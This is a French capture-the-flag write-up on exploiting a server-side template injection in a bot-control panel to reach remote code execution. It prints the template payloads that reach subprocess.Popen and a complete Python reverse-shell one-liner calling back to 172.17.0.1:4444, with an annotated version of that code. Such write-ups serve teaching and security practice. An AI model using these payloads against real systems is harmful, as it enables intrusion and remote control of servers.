# Air CnC

## Recon

Sur la page d'accueil du panel, on trouve des informations sur les bots, on voit aussi un formulaire qui semble permettre de donner des directives aux bots.

On entre n'importe quoi dedans, on voit ensuite que notre entrée est recopiée sur la page suivante. Comme on est connecté en tant qu'admin, pas besoin d'exploiter une XSS pour récupérer des sessions, on va alors s'orienter vers une exploitation de SSTI.

## Tests

On entre `{{7*7}}`, on a alors 49 en retour, on tente aussi `{{config}}`, et hop la config ! Mais pas de flag à l'horizon, serait-il dans une variable de session, un fichier... ? Allons le trouver.

## Exploit

On commence par regarder notre session : `{{session}}`, rien.

Bon, bah cherchons sur le serveur !

> À partir le là il y a pleins de manières d'exécuter du code sur le serveur, je décide d'avoir le luxe de me faire un reverse shell.

1. On cherche `subprocess.Popen` :
    
    `{{ ().__class__.mro()[1].__subclasses__()[226] }}` -> `<class subprocess.Popen>` !

2. Test de fonctionnement :

    `{{ ().__class__.mro()[1].__subclasses__()[226]("ls", shell=True, stdout=-1).communicate()[0] }}` -> `app.py static templates`

3. Reverse shell Python des familles :

    `{{ ().__class__.mro()[1].__subclasses__()[226]("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", shell=True, stdout=-1).communicate()[0] }}`

    Bon on va quand même le décomposer :^)

    Voilà le code en plus joli :

    ```python
    import socket, subprocess, os

    # À modifier en fonction
    IP = "x.x.x.x"
    PORT = 1337

    # On créer un socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # On se connecte à l'adresse et au port donné
    s.connect((IP, PORT))

    # On duplique les file descriptors pour garder la session ouverte
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)

    # On lance /bin/bash
    p = subprocess.call(["/bin/sh", "-i"])
    ```

4. On cherche le flag :

    Une fois qu'on a un reverse shell, on cherche le flag, on peut essayer de parcourir tous les dossiers à notre portée, mais on peut aussi utiliser grep :

    `grep -R "H2G2{" /` -> /flag -> on a le flag
